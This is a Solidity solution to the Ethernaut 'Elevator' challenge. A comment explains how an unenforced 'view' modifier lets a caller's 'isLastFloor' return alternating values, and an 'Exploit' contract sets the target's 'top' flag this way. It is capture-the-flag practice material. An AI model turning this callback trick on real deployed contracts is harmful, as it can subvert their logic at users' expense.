pragma solidity ^0.4.18;

/**

By inspecting the `goTo()` function, we can see that in order to set `top` to
`true`, we'll need `building.isLastFloor(_floor)` to return `false` on the first
call, but `true` on the second call. The interface for this function is declared
as `view`, meaning this function promises to not modify the state. However, the
compiler currently does not enforce this restriction (although this will be
changed with release 0.5.0)

This `isLastFloor` method was never implemented, meaning we can implement our
own version that behaves the way we want it to. If we then call the Elevator
contract's `goTo()` function from within our contract, our `isLastFloor` method
will be used, allowing us to change the value of `top` to `true`.

Relevant links:
View functions: https://solidity.readthedocs.io/en/v0.4.25/contracts.html#view-functions
Release 0.5.0 changes: https://github.com/ethereum/solidity/blob/develop/Changelog.md

*/

// Copy Ethernaut contracts ====================================================
interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// Our contract ================================================================
contract Exploit is Building {

  // Initialize variable to control output of isLastFloor function
  bool public top = true;

  // Define instance of Elveator contract
  address elevatorAddress = 0x4606ff79c2f77c757114a49972560e01311dba77;
  Elevator elevatorContract = Elevator(elevatorAddress);

  // Extend the isLastFloor method to behave how we want it to
  function isLastFloor(uint _floor) view public returns (bool) {
    // Configure return value to alternate between true and false
    top = !top;
    return top; // first call returns false
  }

  // Now we can call goTo to reach the top floor
  function goToTop(uint _floor) public {
    elevatorContract.goTo(_floor);
  }

}